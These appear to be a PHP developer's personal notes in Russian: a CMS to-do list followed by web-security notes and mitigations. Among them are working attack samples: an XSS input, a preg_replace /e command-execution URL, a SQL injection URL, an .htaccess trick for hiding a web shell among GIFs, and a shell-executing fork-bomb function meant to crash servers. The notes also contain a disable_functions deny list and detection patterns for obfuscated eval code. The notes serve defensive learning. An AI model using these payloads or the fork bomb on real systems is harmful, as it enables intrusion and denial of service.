
переделать инсталлятор в один из компонентов модификации текущих настроек


сделать шаблонизацию (эт потом)
!!!!!!!!!!!
надо сделать:
название для шаблона
обработку записи шаблона по названию - либо добавление нового, либо изменение старого
страницу выбора шаблонов
загрузку шаблона из базы данных, с преобразованием json в массив и сохранение его в файл в папке шаблонов

!!!!
еще надо сделать страницу для формирования структуры сайта

!!!!
еще надо сделать страницу для модулей и назначения их в шаблон


записать настройки в таблицу sql в конфиги, и при загрузке таблицы проверять настройки, а в первую очередь - сравнивать место расположения файла настроек (можно тупо читать поле из таблицы, проверять, на месте ли файл и сравнивать контрольные суммы) - конфиги нужны для хранения настроек защиты и паролей, хотя настройки защиты можно поместить в специальный массив в файл настроек, где ключом будет поле защиты, а значением - 1 или 0

pdo - драйвер для работы с разными базами данных

#в поля input для ввода данных можно вставить скрипт, который сработает, например: MyLogin <script>alert('xss');</script>
#уязвимые команды:
eval(),
preg_replace() (с модификатором «e»),
require_once(),
include_once(),
include(),
require(),
create_function().
#поиск уязвимости eval *(str_rot13 *(base64_decode *(

#val(base64_decode("

#примерчик того, какие функции блокируете в php.ini
disable_functions="popen, exec, system, passthru, proc_open, shell_exec, apache_get_modules, apache_get_version, apache_getenv, apache_note, apache_setenv, base64_decode, disk_free_space, diskfreespace, dl, highlight_file, ini_alter, ini_restore, openlog, passthru, phpinfo, proc_nice, shell_exec, show_source, symlink, define_syslog_variables, escapeshellarg, escapeshellcmd,ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, highlight_file,posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_setuid, posix_uname"

#с jooml'ой все кашерно - права 555 позволяют открывать и читать файл, но не изменять

Это баг в php-5.3.* проявляется таким образом. Если в одном из парамтеров php.ini стоит не пробел "" а Off (НУ НЕ ПОМНЮ ССЫЛКИ!!!) то интерпритатор воспринимает это Off как название файла в директории /tmp и если хакер заливает файл с таким названием в эту самую директорию, то интерпритатор со спокойной душой дописывает содержимое этого файла в конец каждого файла php (если у него на это хватает прав). 

#base64_decode - декодирует строку типа YGFsZWN2bXBCY21uLGFtbw== (оканчивается на ==, могут быть пробелы в конце - искать через два равно и ноль или много пробелов в конце строки)

#искать строки где хаотичный порядок символов - большие и маленькие идут через одного, две большие две маленькие и большая подряд

#заменять строку пост или гет запроса экранированием спецсимволов и нулевого байта (%00) или знака вопроса (?)

#включить magic_quotes_gpc проверка get_magic_quotes_gpc() - и его работа с whysiwyg редакторами, функция stripslashes() помогает убирать экранирование двойных кавычек

#полная фильтрация имени файла на опасные расширения загружаемого файла. Для страховки также рекомендуется поместить в директорию с файлами .htaccess с удалением/переопределением опасных расширений. Например: RemoveType .php3 .php .phtml .php4 .php5 .cgi .pl

#addslashes() - экранируем содержимое в слеши

#При передаче элемента массива через GET, POST запросы или куки, ключ не ставится в кавычки. Т.е. например в запросе следует писать array[nameindex] а не array['nameindex'].

#Если переменные хранят значения за двойными кавычками ", то нам даже необязательно выходить за них, что было необходимо с '. Надо хранить значения в одинарных кавычках

#проверять запросы и убирать в конце модификатор /e

#не использовать eval - в PHP интерпретирует переданную ей строку как PHP-код. Без этой функции можно вполне обойтись практически в любом PHP приложении. Очень часто она применяется для удобной смены templat'ов - тем какого-нибудь движка. Хотя сделать тоже самое можно и без eval практически теми же усилиями, разработчики часто прибегают к использованию eval

#закодированные #\/ в post запросе (%23 - URL-закодированный символ #)
preg_replace("#$c#i", '\\1', $mda);
script.php?c=(system\(ls\))%23e%00&mda=system(ls)

#разрешенные на запись файлы htaccess:
Чтобы спрятать шелл, нужно придумать ему неприметное название. Но если он, например, находится в папке для аватар, то как его не переименовывай, файл с расширением php - белая ворона среди гифок и джепегешок. Но что нам мешает загрузить в папку .htaccess файл и указать, что файлы с расширением gif интерпретировать как PHP скрипт.
Строку «AddType application/x-httpd-php gif» можно занести в .htaccess с помощью echo из cmd или простейшим скриптом.

способы борьбы:

-Проверять, не содержит ли переменная $module посторонние символы:
PHP:
<? 
... 
$module = $_GET['module']; 
if (strpbrk($module, '.?/:')) die('Blocked'); 
include $module. '.php'; 
... 
?>


-Проверять, что $module присвоено одно из допустимых значений:
PHP:
... 
$module = $_GET['module']; 
$arr = array('main', 'about', 'links', 'forum'); 
if (!in_array($module,$arr)) $module = $arr[0]; 
include $module . '.php'; 
... 
?>

Так же существует проверка существования файла:
PHP:
<?  
..  
if (file_exists("$page.php")) //Проверяется файл, если он существует, то происходит запуск. 
{  
Include ("$page.php");  
}  
Else //иначе…
{  
Echo "Error!";  
}

От локального инклюда может помочь следующее:
PHP:
<?  
..  
$page=str_replace("/","",$page); // Блокируется возможность перехода в другие дирректории. 
if (file_exists("files/$page.htm "))  
{  
Include ("files/$page.htm");  
}  
Else  
{  
Echo "error";  
}  
…  
?>

PHP предоставляет также возможность отключения использования удаленных файлов, это реализуется путем изменения значения опции allow_url_fopen на Off в файле конфигурации php.ini.


При разработке скриптов полезно пользоваться принципом "Запрещено все, что не разрешено" - инклуд посредством switch'я
<?php
switch ($id) {
case ’lol’:
 include ’lol.php’;
 break;

default:
 include ’heckeng.php’;
} 
?>
Тогда ссылки будут вида
<a href="page.php?id=lol"> Ready to become a mehohecker ?</a>
 
#в wordpress 3.2.1 нет уязвимости в параметре page_id (http://www.volgafoto.com/?page_id=) - как они это сделали?

#опасные функции
Для начала, мы проверяем, какие из нужных нам функций доступны на сервере. Всего их 5:
exec, shell_exec, system, is_resource, passthru.
Описывать каждую функцию я не буду, если Вам интересно, я оставил ссылки на них.
Далее мы просто выполняем форк-запрос через функцию, и если сервер уязвим, то ему поможет только перезагрузка.

//Функция тестирования, которая вешает сервер
function TestFunc($in)
{
    $out = '';
    if (function_exists('exec'))
    {
        @exec($in, $out);
        $out = @join("\n", $out);
    }
    elseif (function_exists('shell_exec'))
    {
        $out = shell_exec($in);
    }
    elseif (function_exists('system'))
    {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    }
    elseif (is_resource($f = @popen($in, "r")))
    {
        $out = "";
        while (!@feof($f))
            $out .= fread($f, 1024);
        pclose($f);
    }
    elseif (function_exists('passthru'))
    {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    }
    return $out;
}
echo TestFunc("echo '. ./_&. ./_&'>_;. ./_"); //Выполнение форка


#про sql защиту от инъекций
https://habrahabr.ru/post/134885/

#Бесполезное экранирование символов
Применение функции экранирования символов, таких как 
mysql_escape_string
mysql_real_escape_string
addslashes
без обрамления кавычками. Чаще всего проявляется в числовых параметрах (всевозможные *_id).

Пример

$sql = "SELECT user FROM userslist WHERE userid=".mysql_real_escape_string($_GET['uid']);

На вид, это безопасный код, но только на вид. Сюда закрался самый частый в моей практике шаблон SQL-инъекций в РНР. Для проведения атаки на эту уязвимость от злоумышленника требуется просто не использовать символы " ' \x00 \r \n \x1a в векторе атаки. 
Например:

/index.php?uid=-777 UNION SELECT password FROM userlist

#https://xakep.ru/2011/12/06/57950/

гуглить борьба с sql и php инъекциями